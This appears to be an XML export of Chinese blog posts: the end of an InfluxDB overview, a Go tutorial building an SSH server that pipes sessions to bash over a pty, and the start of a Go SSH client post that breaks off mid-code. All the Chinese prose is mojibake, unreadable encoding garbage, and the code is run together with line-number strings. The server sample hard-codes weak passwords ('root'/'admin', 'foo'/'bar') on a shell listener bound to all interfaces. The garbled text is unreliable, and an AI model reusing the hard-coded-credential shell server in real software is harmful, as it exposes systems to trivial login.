ä¼šè¿›è¡Œç´¢å¼•ï¼Œæ–¹ä¾¿æŸ¥è¯¢æ—¶ç”¨äºè¿‡æ»¤æ¡ä»¶ï¼Œ æ ¼å¼: =,=, æ¯”å¦‚ä¸Šé¢çš„location=us-midwest field_set: ä½¿ç”¨ç©ºæ ¼ä¸tag_setéš”å¼€, æ ‡ç¤ºä¸€ç»„Fieldçš„é›†åˆ, ç”¨äºä¿å­˜è¯¥ç‚¹ä½å¤šç»´åº¦çš„å€¼, æ”¯æŒå„ç§ç±»å‹ï¼Œæ•°æ®å­˜å‚¨æ—¶ä¸ä¼šè¿›è¡Œç´¢å¼•,æ ¼å¼: =,=, æ¯”å¦‚ä¸Šé¢çš„temperature=82 timestamp: é‡‡é›†è¯¥ç‚¹ä½çš„æ—¶é—´æˆ³, æ—¶é—´çš„é»˜è®¤ç²¾åº¦æ˜¯çº³ç§’. å­˜å‚¨ç­–ç•¥:measurements,tag keys,field keys,tag valueså…¨å±€å­˜ä¸€ä»½ã€‚field valueså’Œtimestampsæ¯æ¡æ•°æ®å­˜ä¸€ä»½ã€‚ Retention PolicyæŒ‡æ•°æ®çš„ä¿å­˜ç­–ç•¥, åŒ…å«æ•°æ®çš„ä¿å­˜æ—¶é—´å’Œå‰¯æœ¬æ•°(é›†ç¾¤ä¸­çš„æ¦‚å¿µ),é»˜è®¤ä¿å­˜æ—¶é—´æ˜¯æ°¸ä¹…ï¼Œå‰¯æœ¬æ˜¯1ä¸ª, ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹, ä¹Ÿå¯ä»¥åˆ›å»ºæ–°çš„ä¿å­˜ç­–ç•¥ SeriesInfluxDBä¸­å…ƒæ•°æ®çš„æ•°æ®ç»“æ„ä½“, seriesç›¸å½“äºæ˜¯InfluxDBä¸­å…ƒæ•°æ®çš„é›†åˆï¼Œåœ¨åŒä¸€ä¸ªdatabaseä¸­ï¼Œretention policyã€measurementã€tag setså®Œå…¨ç›¸åŒçš„æ•°æ®åŒå±äºä¸€ä¸ªseriesï¼ŒåŒä¸€ä¸ªseriesçš„æ•°æ®åœ¨ç‰©ç†ä¸Šä¼šæŒ‰ç…§æ—¶é—´é¡ºåºæ’åˆ—å­˜å‚¨åœ¨ä¸€èµ·ã€‚series çš„keyä¸º measurement+æ‰€æœ‰tagsçš„åºåˆ—åŒ–å­—ç¬¦ä¸², ä»–ä¿å­˜ç€è¯¥seriesçš„Retention policy, Measurement,Tag set, æ¯”å¦‚:123456|--------------------------------------------------------------------------------------------------||Arbitrary series number | Retention policy | Measurement | Tag set ||series 1 | autogen | census | location = 1,scientist = langstroth ||series 2 | autogen | census | location = 2,scientist = langstroth ||series 3 | autogen | census | location = 1,scientist = perpetua ||--------------------------------------------------------------------------------------------------| PointInfluxDBä¸­å•æ¡æ’å…¥è¯­å¥çš„æ•°æ®ç»“æ„ä½“, ç”¨äºä¿å­˜ç‚¹ä½çš„å€¼çš„é›†åˆ, æ¯ä¸€ä¸ªPointé€šè¿‡serieså’Œtimestampè¿›è¡Œå”¯ä¸€æ ‡ç¤º:1234name: census-----------------time butterflies honeybees location scientist2015-08-18T00:00:00Z 1 30 1 perpetua Schemaç”¨äºæè¿°æ•°æ®åœ¨InfluxDBçš„ç»„ç»‡å½¢å¼, InfluxDBçš„Schemaååˆ†ç®€å•ç”± è¿™äº›æ¦‚å¿µç»„æˆ: databases retention policies series measurements tag keys tag values field keysåœ¨æ“ä½œæ•°æ®åº“çš„æ—¶å€™ï¼Œéœ€è¦çŸ¥é“è¿™äº›æ¦‚å¿µã€‚ Continuous Queryç®€ç§°CQ, æ˜¯é¢„å…ˆé…ç½®å¥½çš„ä¸€äº›æŸ¥è¯¢å‘½ä»¤ï¼ŒSELECTè¯­å¥å¿…é¡»åŒ…å«GROUP BY time()ï¼Œinfluxdbä¼šå®šæœŸè‡ªåŠ¨æ‰§è¡Œè¿™äº›å‘½ä»¤å¹¶å°†æŸ¥è¯¢ç»“æœå†™å…¥æŒ‡å®šçš„å¦å¤–çš„measurementä¸­ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¹¶ç»“åˆRPæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°ä¿å­˜ä¸åŒç²’åº¦çš„æ•°æ®ï¼Œæ ¹æ®æ•°æ®ç²’åº¦çš„ä¸åŒè®¾ç½®ä¸åŒçš„ä¿å­˜æ—¶é—´ï¼Œè¿™æ ·ä¸ä»…èŠ‚çº¦äº†å­˜å‚¨ç©ºé—´ï¼Œè€Œä¸”åŠ é€Ÿäº†æ—¶é—´é—´éš”è¾ƒé•¿çš„æ•°æ®æŸ¥è¯¢æ•ˆç‡ï¼Œé¿å…æŸ¥è¯¢æ—¶å†è¿›è¡Œèšåˆè®¡ç®—ã€‚ å­˜å‚¨å¼•æ“ä»LevelDB(LSM Tree)ï¼Œåˆ°BoltD(mmap B+æ ‘)ï¼Œç°åœ¨æ˜¯è‡ªå·±å®ç°çš„TSM Treeçš„ç®—æ³•ï¼Œç±»ä¼¼LSM Treeï¼Œé’ˆå¯¹InfluxDBçš„ä½¿ç”¨åšäº†ç‰¹æ®Šä¼˜åŒ–ã€‚ ShardShardè¿™ä¸ªæ¦‚å¿µå¹¶ä¸å¯¹æ™®é€šç”¨æˆ·å¼€æ”¾ï¼ŒShardä¹Ÿä¸æ˜¯å­˜å‚¨å¼•æ“, å®ƒåœ¨å­˜å‚¨å¼•æ“ä¹‹ä¸Šçš„ä¸€ä¸ªæ¦‚å¿µ, å­˜å‚¨å¼•æ“è´Ÿè´£å­˜å‚¨shard, å› æ­¤åœ¨è®²å­˜å‚¨å¼•æ“ä¹‹å‰å…ˆè®²æ˜shardã€‚ åœ¨InfluxDBä¸­æŒ‰ç…§æ•°æ®çš„æ—¶é—´æˆ³æ‰€åœ¨çš„èŒƒå›´ï¼Œä¼šå»åˆ›å»ºä¸åŒçš„shardï¼Œæ¯ä¸€ä¸ªshardéƒ½æœ‰è‡ªå·±çš„å­˜å‚¨å¼•æ“ç›¸å…³æ–‡ä»¶ï¼Œè¿™æ ·åšçš„ç›®çš„å°±æ˜¯ä¸ºäº†å¯ä»¥é€šè¿‡æ—¶é—´æ¥å¿«é€Ÿå®šä½åˆ°è¦æŸ¥è¯¢æ•°æ®çš„ç›¸å…³èµ„æºï¼ŒåŠ é€ŸæŸ¥è¯¢çš„è¿‡ç¨‹ï¼Œå¹¶ä¸”ä¹Ÿè®©ä¹‹åçš„æ‰¹é‡åˆ é™¤æ•°æ®çš„æ“ä½œå˜å¾—éå¸¸ç®€å•ä¸”é«˜æ•ˆã€‚ å®ƒå’Œretention policyç›¸å…³è”ã€‚æ¯ä¸€ä¸ªå­˜å‚¨ç­–ç•¥ä¸‹ä¼šå­˜åœ¨è®¸å¤šshardï¼Œæ¯ä¸€ä¸ªshardå­˜å‚¨ä¸€ä¸ªæŒ‡å®šæ—¶é—´æ®µå†…çš„æ•°æ®ï¼Œå¹¶ä¸”ä¸é‡å¤ï¼Œä¾‹å¦‚7ç‚¹-8ç‚¹çš„æ•°æ®è½å…¥shard0 ä¸­ï¼Œ8ç‚¹-9ç‚¹çš„æ•°æ®åˆ™è½å…¥shard1ä¸­ã€‚æ¯ä¸€ä¸ªshardéƒ½å¯¹åº”ä¸€ä¸ªåº•å±‚çš„å­˜å‚¨å¼•æ“ã€‚ å½“æ£€æµ‹åˆ°ä¸€ä¸ªshardä¸­çš„æ•°æ®è¿‡æœŸåï¼Œåªéœ€è¦å°†è¿™ä¸ªshardçš„èµ„æºé‡Šæ”¾ï¼Œç›¸å…³æ–‡ä»¶åˆ é™¤å³å¯ï¼Œè¿™æ ·çš„åšæ³•ä½¿å¾—åˆ é™¤è¿‡æœŸæ•°æ®å˜å¾—éå¸¸é«˜æ•ˆã€‚ LevelDBBoltDBTSM TreeåŠŸèƒ½ä½¿ç”¨å®‰è£…ä¸éƒ¨ç½²æˆ‘è¿™é‡Œä¸»è¦åšåŠŸèƒ½æµ‹è¯•, åé¢ä¼šæœ‰æœºä¼šä¸“é—¨åšæ€§èƒ½æµ‹è¯•, å› æ­¤è¿™é‡Œä½¿ç”¨å®˜æ–¹æä¾›çš„dockeré•œåƒéƒ¨ç½²,å®˜æ–¹é•œåƒæœ€æ–°ä¹Ÿæ˜¯1.2ç‰ˆæœ¬é…ç½®Daocloudçš„é•œåƒåŠ é€Ÿæºæˆ–è€…é˜¿é‡Œçš„åŠ é€Ÿæº,ç„¶åç›´æ¥æ‹‰å–é•œåƒ1docker pull influxdb ç”±äºinfluxDBå¼€å‘æ—¶å°±è®¾è®¡å¥½äº†, å®˜æ–¹ä¹Ÿç»™å‡ºäº†ç¯å¢ƒé…ç½®å˜é‡,å¯åŠ¨æ—¶å¯ä»¥é€šè¿‡è¿™äº›ç¯å¢ƒå˜é‡å¯¹influxdbè¿›è¡Œé…ç½®InfluxDBé…ç½® å‡½æ•°ä¸SQLå†…éƒ¨æä¾›å¾ˆå¤šå‡½æ•°,æ–¹ä¾¿ä¸€äº›åŸºæœ¬æ“ä½œInfluxQL Functions123456789101112131415161718192021222324252627282930&gt; SELECT MEAN("water_level") FROM "h2o_feet" WHERE "location"='coyote_creek' AND time &gt;= '2015-08-18T00:06:00Z' AND time &lt;= '2015-08-18T00:54:00Z' GROUP BY time(18m)name: h2o_feettime mean---- ----2015-08-18T00:00:00Z 7.9462015-08-18T00:18:00Z 7.63233333333333252015-08-18T00:36:00Z 7.2386666666666672015-08-18T00:54:00Z 6.982&gt; SELECT MAX("water_level") FROM "h2o_feet" WHERE time &gt;= '2015-08-18T00:00:00Z' AND time &lt; '2015-08-18T00:54:00Z' GROUP BY time(12m), "location"name: h2o_feettags: location = coyote_creektime max---- ---2015-08-18T00:00:00Z 8.122015-08-18T00:12:00Z 7.8872015-08-18T00:24:00Z 7.6352015-08-18T00:36:00Z 7.3722015-08-18T00:48:00Z 7.11name: h2o_feettags: location = santa_monicatime max---- ---2015-08-18T00:00:00Z 2.1162015-08-18T00:12:00Z 2.1262015-08-18T00:24:00Z 2.0512015-08-18T00:36:00Z 2.0672015-08-18T00:48:00Z 1.991 ç”¨æˆ·è®¤è¯å’Œæƒé™Retention PolicyCotinuous Queryå¸¸è§æ“ä½œ(SQL)æ€§èƒ½å»ºè®®å®˜æ–¹æœ‰å¾ˆè¯¦è§£çš„è¯´æ˜,æˆ‘è¿™é‡Œä»…æˆªå–å‡ºå•èŠ‚ç‚¹éƒ¨åˆ†:å®˜æ–¹æ¨èç¡¬ä»¶é…ç½® Load Field writes per second MOderate queries per second Unique series Low &lt; 5 thousand &lt; 5 &lt; 100 thousand Moderate &lt; 250 thousand &lt; 25 &lt; 1 million High &gt; 250 &gt; 25 &gt; 1 million Probobly infeasible &gt; 750 thousand &gt; 100 &gt; 10 million æ ¹æ®è´Ÿè½½æƒ…å†µå®˜æ–¹æ¨èçš„ç¡¬ä»¶éœ€æ±‚: Load CPU RAM IOPS Low 2-4 cores 2-4 G 500 Moderate 4-6 cores 8-32 G 500-1000 High 8 cores 32+ G 1000+]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
        <category>æ—¶åºæ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>influxdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(å››)-Golangä¸­SSHæœåŠ¡ç«¯çš„å®ç°]]></title>
    <url>%2F2017%2F02%2F23%2Fgo-ssh-server%2F</url>
    <content type="text"><![CDATA[ä¸Šç¯‡åšå®¢ä»‹ç»äº†å¦‚ä½•äº²æ‰‹å®ç°ä¸€ä¸ªSSHçš„å®¢æˆ·ç«¯, è¿™ç¯‡åšå®¢å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨golangçš„SSHåŒ…æ„å»ºä¸€ä¸ªè‡ªå·±çš„SSH Server, è¿™æ ·æˆ‘ä»¬åŸºæœ¬å°±èƒ½æ¯”è¾ƒå…¨é¢çš„äº†è§£çš„SSHçš„å®ç°ã€‚ä¸ºæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªSSH Proxyå¥ å®šåŸºçŸ³ã€‚ ç®€ä»‹ ä»¥ä¸Šæ˜¯SSHåè®®ä¸€ä¸ªåŸºæœ¬æ¶æ„å›¾, å…³äºSSHåè®®çš„ç®€ä»‹å¯ä»¥å‚è€ƒè·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŸç†ç®€ä»‹, åªæœ‰åœ¨äº†è§£äº†SSHåè®®ç›¸å…³çš„åŸºç¡€ä¸Š,æ‰èƒ½ç†è§£SSHåŒ…é‡Œé¢çš„å‚æ•°ã€‚å¯¹ç…§ç€SSHåè®®, å°†ä¸Šé¢çš„æ¶æ„å›¾åšç®€è¦è§£è¯»: TCP: å»ºç«‹ä¼ è¾“å±‚é“¾æ¥, ç„¶åè¿›è¡ŒSSHåè®®å¤„ç† Handshake: å»ºç«‹SSHåè®®é‡Œé¢çš„ä¼ è¾“å±‚[SSH-TRANS,è¯¥å±‚ä¸»è¦æä¾›åŠ å¯†ä¼ è¾“ Authentication: SSHåè®®é‡Œé¢çš„ç”¨æˆ·è®¤è¯å±‚[SSH-USERAUTH], æä¾›ç”¨æˆ·è®¤è¯ Channelå’ŒRequest: è¿™äº›éƒ½æ˜¯SSHåè®®é‡Œé¢çš„é“¾æ¥å±‚[SSH-CONNECT], è¯¥å±‚ä¸»è¦æ˜¯å°†å¤šä¸ªåŠ å¯†éš§é“åˆ†æˆé€»è¾‘é€šé“, å¯ä»¥å¤ç”¨é€šé“,é€šé“æœ‰æ¯”è¾ƒå¤šçš„ç±»å‹ï¼šsessionã€x11ã€forwarded-tcpipã€direct-tcpip, é€šé“é‡Œé¢çš„Requestsæ˜¯ç”¨äºæ¥æ”¶åˆ›å»ºssh channleçš„è¯·æ±‚çš„, è€Œssh channleå°±æ˜¯é‡Œé¢çš„connection, æ•°æ®çš„äº¤äº’åŸºäºconnectionäº¤äº’ã€‚ Serveré…ç½® é¦–å…ˆ, æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªSSH Serverçš„é…ç½®, è¿™é‡Œä¸»è¦æ˜¯é…ç½®è®¤è¯, ä½œä¸ºä¸€ä¸ªSSH Serveré»˜è®¤æ˜¯åº”è¯¥æ”¯æŒ2è®¤è¯: å¯†é’¥è®¤è¯å’Œå¯†ç è®¤è¯, ä¸ºäº†æ–¹ä¾¿æˆ‘ä»…å®ç°å¯†ç è®¤è¯ã€‚å®ç°å¯†ç è®¤è¯çš„æ ¸å¿ƒæ˜¯å®ç°Server Configå¯¹è±¡é‡Œé¢çš„PasswordCallbackçš„å‡½æ•°, è¯¥å‡½æ•°çš„æ ¸å¿ƒæ˜¯è¿”å›ä¸€ä¸ªssh.Permissionså¯¹è±¡, è¯¥å¯¹è±¡ä¿æŒäº†Userè®¤è¯é€šè¿‡çš„ä¿¡æ¯ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿, å¹¶æ²¡æœ‰å°†è®¤è¯ç³»ç»Ÿå’ŒPAMå¯¹æ¥, è€Œæ˜¯ç›´æ¥ç®€å•çš„å®ç°äº†ä¸€ä¸ªç”¨æˆ·åå¯†ç æ¯”è¾ƒã€‚è¿™ä¹Ÿæ˜¯å¾ˆæ ¸å¿ƒçš„ä¸€ä¸ªç‚¹, åŸºäºæ­¤ æˆ‘ä»¬åœ¨è®¾è®¡è·³æ¿æœºçš„æ—¶å€™, å¯ä»¥å®ç°Serverç«¯çš„ç»Ÿä¸€è®¤è¯, åœ¨è¿™é‡Œæ’å…¥ç»Ÿä¸€è®¤è¯çš„ä»£ç ã€‚ 12345678config := &amp;ssh.ServerConfig&#123; PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; if c.User() == "root" &amp;&amp; string(pass) == "admin" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;,&#125; å…¶æ¬¡, æˆ‘ä»¬éœ€è¦é…ç½®SSH Serverçš„ç§é’¥, éœ€è¦ä¿è¯ç§é’¥çš„å®‰å…¨, å› ä¸ºä»–ç”¨äºè¿›è¡Œç§˜é’¥äº¤æ¢ç®—æ³•çš„å…³é”®(DH)1234567891011privateBytes, err := ioutil.ReadFile("id_rsa")if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)")&#125;private, err := ssh.ParsePrivateKey(privateBytes)if err != nil &#123; log.Fatal("Failed to parse private key")&#125;config.AddHostKey(private) å»ºç«‹SSHé€šé“(SSHé“¾æ¥å±‚) SSH Serveré…ç½®å®Œæˆå, é¦–å…ˆå¾—å»ºç«‹TCPé“¾æ¥123456789101112listener, err := net.Listen("tcp", "0.0.0.0:2200")if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err)&#125;log.Print("Listening on 2200...")for &#123; conn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; ç„¶åæˆ‘ä»¬é€šè¿‡ssh.NewServerConnæ¥å‡çº§TCPé“¾æ¥ä¸ºSSHé“¾æ¥, sshæä¾›çš„è¿™ä¸ªå‡½æ•°æ ¹æ®ä¹‹å‰çš„é…ç½®å®Œæˆ: 1. ä¼ è¾“å±‚[SSH-TRANS] 2. è®¤è¯å±‚[SSH-USERAUTH] 3. è¿”å›é“¾æ¥å±‚çš„é€šé“: incomingChannels, æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨Goroutineé‡Œé¢å¤„ç†è¿™äº›ç”¨æˆ·çš„é€šé“ã€‚1234567891011 sshConn, chans, reqs, err := ssh.NewServerConn(conn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans)&#125; è¿™æ ·æˆ‘ä»¬å°±å·²ç»å®Œæˆäº†SSH Serverçš„è¿æ¥çš„ç›‘å¬ ä¸ºäº†ä¸é˜»å¡é€šé“çš„å¤„ç†, æˆ‘ä»¬å°†æ¯ä¸€ä¸ªé€šé“çš„å¤„ç†éƒ½æ”¾åˆ°Goroutineé‡Œé¢è¿›è¡Œ12345func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125; åœ¨å¤„ç†ssh channelé‡Œé¢çš„æ•°æ®ä¹‹å‰, æˆ‘ä»¬éœ€è¦çŸ¥é“channelçš„ç±»å‹, å› ä¸ºä¸åŒç±»å‹çš„channelé‡Œé¢æ˜¯ä¸åŒç±»å‹çš„æ•°æ®, å¤„ç†é€»è¾‘ä¹Ÿä¸ä¸€æ ·å…·ä½“è§rfc4250çš„4.9.1, é‡Œé¢æœ‰æ¯”è¾ƒè¯¦è§£çš„è§£é‡Š, æˆ‘ä»¬å…ˆä¸å®ç°å…¶ä»–çš„,ä»…å®ç°å¤„ç†sessionç±»å‹channelã€‚ä¸Šé¢æåˆ°äº†é€šé“æœ‰4ç§ç±»å‹, æ¯ç§ç±»å‹éƒ½æœ‰ä¸åŒçš„ç”¨é€”,è¿™é‡Œæˆ‘ä»¬ä»…å®ç°sessionç±»å‹é€šé“çš„å¤„ç†ã€‚123456func handleChannel(newChannel ssh.NewChannel) &#123; if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, "unknown channel type") return &#125;&#125; å»ºç«‹SSH Channel(å›è¯äº¤äº’) é€šé“æä¾›ä¸€ä¸ªAcceptæ–¹æ³•, è¯¥æ–¹æ³•è¿”å›2ä¸ªqueue, 1ä¸ªç”¨äºæ•°æ®äº¤æ¢(æ¶æ„å›¾é‡Œé¢çš„connection), 1ä¸ªç”¨äºæ§åˆ¶æŒ‡ä»¤çš„äº¤äº’,æ¯”å¦‚åˆ›å»ºconnection queue(æ¶æ„å›¾é‡Œé¢çš„requests)12345connection, requests, err := newChannel.Accept()if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return&#125; æ•°æ®äº¤äº’æˆ‘ä»¬å°†è¿è¡Œbashç¨‹åº,ç„¶åbashä¸ ssh channelå¯¹æ¥, ä»è€Œå®ç°å’Œbashçš„è¿œç¨‹äº¤äº’, ä»è¿™é‡Œå¯ä»¥çœ‹å‡º, å…¶å®è¿™é‡Œå¯ä»¥æ‰©å±•æ€§å¾ˆé«˜, æˆ‘ä»¬å¦‚æœè¿è¡Œå…¶ä»–æœåŠ¡æ¯”å¦‚git,é‚£ä¹ˆgitä¹Ÿå¯é€šè¿‡sshé“¾æ¥æ¥äº¤äº’ã€‚ gitä¹Ÿæ­£æ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ”¯æŒsshçš„ã€‚è¿™é‡Œå‡†å¤‡äº†ä¸€ä¸ªcolseå‡½æ•°ç”¨äºå…³é—­ssh channelå’Œé€€å‡ºbashç¨‹åº1234567891011bash := exec.Command("bash")// Prepare teardown functionclose := func() &#123; _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; connection.Close() log.Printf("Session closed")&#125; å¦‚æœæˆ‘ä»¬ç›´æ¥å°†bashçš„è¾“å…¥å’Œè¾“å‡ºæµè¡Œterminalè¿™å°†å¤±è´¥, å› ä¸ºbashæ²¡æœ‰è¿è¡Œåœ¨ttyä¸­, å› æ­¤è¿™é‡Œéœ€è¦ä¸€ä¸ªæ¨¡æ‹Ÿtty(pty)æ¥è¿è¡Œbashã€‚123456bashf, err := pty.Start(bash)if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return&#125; æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å°† bashçš„ç®¡é“å’Œconnectionçš„ç®¡é“å¯¹æ¥èµ·æ¥, è¿™é‡Œä¸ºäº†ä¿è¯colseå‡½æ•°(connectionèµ„æºé‡Šæ”¾)åªè¢«è°ƒç”¨ä¸€æ¬¡ä½¿ç”¨çš„sync.Onceã€‚123456789var once sync.Oncego func() &#123; io.Copy(connection, bashf) once.Do(close)&#125;()go func() &#123; io.Copy(bashf, connection) once.Do(close)&#125;() æŒ‡ä»¤äº¤äº’è¿™é‡Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç±»è¯·æ±‚: shell/exec/subsystem: channel request type for shell, è¿™å‡ ç±»ä¸»è¦æ˜¯ç”¨äºåŒºåˆ†connectioné“¾æ¥çš„ç¨‹åº, shellå€¼åé¢å¯åŠ¨çš„ä¸€ä¸ªç¨‹åºæˆ–è€…shell, execæŒ‡åé¢å¯åŠ¨çš„æ˜¯ç”¨æˆ·çš„é»˜è®¤shell, è€Œsubsystemæ˜¯åœ¨åé¢å¯åŠ¨ä¸€ä¸ªå­ç¨‹åºæ¥æ‰§è¡Œconnectioné‡Œé¢çš„å‘½ä»¤ pty-req: å‡†å¤‡ä¸€ä¸ªptyç­‰å¾…è¾“å…¥ window-change: ç›‘å¬ttyçª—å£æ”¹å˜äº‹ä»¶ã€‚åŠæ—¶æ›´æ–°tty sizeã€‚123456789101112131415161718192021 go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125; å®Œæ•´ä»£ç ä»¥ä¸‹æ˜¯å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184package mainimport ( "encoding/binary" "fmt" "io" "io/ioutil" "log" "net" "os/exec" "sync" "syscall" "unsafe" "github.com/kr/pty" "golang.org/x/crypto/ssh")func main() &#123; // In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed // in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing // net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn // into an ssh.ServerConn config := &amp;ssh.ServerConfig&#123; //Define a function to run when a client attempts a password login PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; // Should use constant-time compare (or better, salt+hash) in a production setting. if c.User() == "foo" &amp;&amp; string(pass) == "bar" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;, // You may also explicitly allow anonymous client authentication, though anon bash // sessions may not be a wise idea // NoClientAuth: true, &#125; // You can generate a keypair with 'ssh-keygen -t rsa' privateBytes, err := ioutil.ReadFile("id_rsa") if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)") &#125; private, err := ssh.ParsePrivateKey(privateBytes) if err != nil &#123; log.Fatal("Failed to parse private key") &#125; config.AddHostKey(private) // Once a ServerConfig has been configured, connections can be accepted. listener, err := net.Listen("tcp", "0.0.0.0:2200") if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err) &#125; // Accept all connections log.Print("Listening on 2200...") for &#123; tcpConn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; // Before use, a handshake must be performed on the incoming net.Conn. sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion()) // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans) &#125;&#125;func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; // Service the incoming Channel channel in go routine for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125;func handleChannel(newChannel ssh.NewChannel) &#123; // Since we're handling a shell, we expect a // channel type of "session". The also describes // "x11", "direct-tcpip" and "forwarded-tcpip" // channel types. if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t)) return &#125; // At this point, we have the opportunity to reject the client's // request for another logical connection connection, requests, err := newChannel.Accept() if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return &#125; // Fire up bash for this session bash := exec.Command("bash") // Prepare teardown function close := func() &#123; connection.Close() _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; log.Printf("Session closed") &#125; // Allocate a terminal for this channel log.Print("Creating pty...") bashf, err := pty.Start(bash) if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return &#125; //pipe session to bash and visa-versa var once sync.Once go func() &#123; io.Copy(connection, bashf) once.Do(close) &#125;() go func() &#123; io.Copy(bashf, connection) once.Do(close) &#125;() // Sessions have out-of-band requests such as "shell", "pty-req" and "env" go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) // Responding true (OK) here will let the client // know we have a pty ready for input req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125;// parseDims extracts terminal dimensions (width x height) from the provided buffer.func parseDims(b []byte) (uint32, uint32) &#123; w := binary.BigEndian.Uint32(b) h := binary.BigEndian.Uint32(b[4:]) return w, h&#125;// Winsize stores the Height and Width of a terminal.type Winsize struct &#123; Height uint16 Width uint16 x uint16 // unused y uint16 // unused&#125;// SetWinsize sets the size of the given pty.func SetWinsize(fd uintptr, w, h uint32) &#123; ws := &amp;Winsize&#123;Width: uint16(w), Height: uint16(h)&#125; syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(ä¸‰)-Golangä¸­SSHå®¢æˆ·ç«¯çš„å®ç°]]></title>
    <url>%2F2017%2F02%2F22%2Fssh-protocol-go%2F</url>
    <content type="text"><![CDATA[ä¸Šé¢å‡ ç¯‡åšå®¢å·²ç»ä»‹ç»è¿‡åŠ å¯†ç®—æ³•å’Œsshåè®®çš„æ„æˆ, è¿™ç¯‡åšå®¢ä¸»è¦å°†ä»‹ç»golangä¸­sshåº“çš„ä¸€äº›å…·ä½“ä½¿ç”¨,ä¸ºåé¢å†™sshçš„è·³æ¿æœºåšé“ºå«ã€‚ æ —å­å…ˆä¸Š2ä¸ªæ —å­, åé¢ä¼šå¯¹æ­¤åšè¯¦ç»†ä»‹ç»Shelläº¤äº’æ¨¡å¼1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 package mainimport ( "log" "os" "golang.org/x/crypto/ssh" "golang.org/x/crypto/ssh/terminal")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, 